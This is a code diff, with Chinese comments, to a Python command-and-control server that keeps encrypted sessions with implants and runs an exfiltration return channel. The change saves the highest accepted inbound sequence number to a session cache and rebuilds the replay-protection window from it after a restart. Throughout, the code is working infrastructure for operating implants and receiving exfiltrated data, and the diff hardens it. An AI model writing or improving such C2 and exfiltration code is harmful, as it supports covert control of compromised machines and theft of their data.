@@ -96,6 +96,10 @@ class SessionState:
         self.state = self.EXPECT_HELLO
         self.envelope: Optional[SealedEnvelope] = None  # 建立后才有
         self.seq_out = 0          # 本端发送序号
+        self.seq_in = -1          # 本端已接受的**最高**上行序号（-1 = 尚未收到）
+                                  # 注意不是"下一个期望"：序号允许乱序/跳号，
+                                  # 真正的重放判定由 ReplayWindow 负责，
+                                  # 本字段只用于持久化与跨重启重建窗口基线。
         self.transcript = b""      # 握手 transcript
         self.handshake_hash = b""
         self.k_c2s: Optional[bytes] = None   # 会话密钥：植入端 -> 服务端
@@ -218,17 +222,11 @@ class C2Server:
 
         # 落会话恢复缓存：重连时不必重新握手。
         # 记的是当时的收发计数 —— 恢复必须带走计数器，归零即 IV 重用。
-        if self._cache is not None:
+        self._cache_put(sess)
+        if self._cache is not None and self._cache_path:
             try:
-                self._cache.put(
-                    sess.implant_id, sess.generation,
-                    k_c2s, k_s2c,
-                    sess.seq_out, 0,
-                    self._cell_send_counter(sess), self._cell_recv_counter(sess))
-                if self._cache_path:
-                    self._cache.save(self._cache_path)
+                self._cache.save(self._cache_path)
             except CacheError:
-                # 缓存失败不得影响会话本身 —— 最坏退化为"下次重新握手"
                 pass
 
     # ------------------------------------------------------------------
@@ -243,6 +241,29 @@ class C2Server:
     def _cell_recv_counter(sess: SessionState) -> int:
         # 服务端在回传通道上是接收方，其 counter 即信元流已接受的最大序号
         return 0 if sess.exfil_sink is None else sess.exfil_sink.counter
+
+    def _cache_put(self, sess: "SessionState") -> None:
+        """把会话的当前计数状态写回缓存（覆盖同 id 的旧条目）。
+
+        为什么每帧都要写，而不只在握手完成时写：
+            握手完成时 seq_in 还是 -1（尚未收到任何上行帧）。若只在那一次
+            落缓存，则缓存里的 seq_in 永远是 -1，恢复后重放窗口基线为"未收到"，
+            重连的旧序号会被当 new 接受 —— 重放防护在重启后失效。
+            （这是本方法存在的唯一理由，不要"优化"成只在握手时写一次。）
+        """
+        if self._cache is None:
+            return
+        if sess.k_c2s is None or sess.k_s2c is None:
+            return
+        try:
+            self._cache.put(
+                sess.implant_id, sess.generation,
+                sess.k_c2s, sess.k_s2c,
+                sess.seq_out, sess.seq_in,
+                self._cell_send_counter(sess), self._cell_recv_counter(sess))
+        except CacheError:
+            # 缓存失败不得影响会话本身 —— 最坏退化为"下次重新握手"
+            pass
 
     def resume_session(self, implant_id: str) -> bool:
         """从缓存恢复一个会话。成功返回 True，无缓存/已过期返回 False。
@@ -264,10 +285,16 @@ class C2Server:
         sess.k_c2s = ent["k_c2s"]
         sess.k_s2c = ent["k_s2c"]
         sess.seq_out = ent["seq_out"]
+        sess.seq_in = ent["seq_in"]
         sess.envelope = SealedEnvelope(sess.k_s2c, sess.k_c2s, ROLE_SERVER)
         sess.state = SessionState.ESTABLISHED
         sess.resumed = True
         self._sessions[implant_id] = sess
+
+        # 用持久化的 seq_in 重建重放窗口基线 —— 不重建则服务端重启后
+        # 重放防护整体失效（窗口为空，旧序号被当 new 接受）。
+        self._replay.seed(ReplayKey(implant_id, ent["generation"]),
+                          ent["seq_in"])
 
         # 回传通道按断点续接建立
         sess.exfil_sink = ExfilSink.for_implant(
@@ -320,6 +347,13 @@ class C2Server:
         if verdict != ReplayWindow.ACCEPTED:
             self._drop(sess.implant_id, f"replay verdict: {verdict}")
             return
+
+        # 记录已接受的最高上行序号。必须放在 accept **之后**：
+        # 被判为重放的帧不应推进基线，否则伪造帧能把基线推高，
+        # 使后续真实帧落入 "too_old" 而被拒。
+        if seq > sess.seq_in:
+            sess.seq_in = seq
+            self._cache_put(sess)   # 回写缓存，使落盘时带的是最新基线
 
         self._dispatch(sess, seq, msg_type, payload)
 
